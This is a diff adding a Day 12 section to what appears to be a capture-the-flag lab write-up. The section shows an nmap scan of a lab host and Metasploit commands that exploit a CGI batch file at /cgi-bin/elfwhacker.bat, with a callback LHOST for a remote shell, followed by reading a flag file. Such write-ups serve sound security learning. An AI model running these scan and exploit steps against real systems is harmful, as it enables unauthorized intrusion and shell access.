@@ -432,13 +432,45 @@ Answer:
 
 ## Day 12: Ready, set, elf.
 
+scan the target
 
+```
+nmap -sS -sV -T4 10.10.183.254
+```
 
+![image](https://user-images.githubusercontent.com/90561566/219908537-c01961c9-d582-49d3-b680-5667891fcc98.png)
 
+view the webserver
 
+![image](https://user-images.githubusercontent.com/90561566/219908614-653d3d28-7284-483e-be81-c5cd78efb862.png)
 
+search for the exploit
 
+```
+msfconsole
+```
 
+![image](https://user-images.githubusercontent.com/90561566/219908889-cba45bce-411d-4ad8-93f7-5e808944ec91.png)
 
+```
+use 0
+info
+```
 
+![image](https://user-images.githubusercontent.com/90561566/219908913-362de750-ada9-4dd5-aee4-c60dc4d6a245.png)
 
+```
+set LHOST 10.9.43.204
+set RHOSTS 10.10.183.254
+set TARGETURI /cgi-bin/elfwhacker.bat
+exploit
+```
+
+![image](https://user-images.githubusercontent.com/90561566/219908969-6d07b850-0fb5-4824-9eeb-a0fd1766876e.png)
+
+```
+dir
+cat flag1.txt
+```
+
+![image](https://user-images.githubusercontent.com/90561566/219909086-ccff5f3f-6b0e-4e29-b8d7-2a16eeb7fe1a.png)
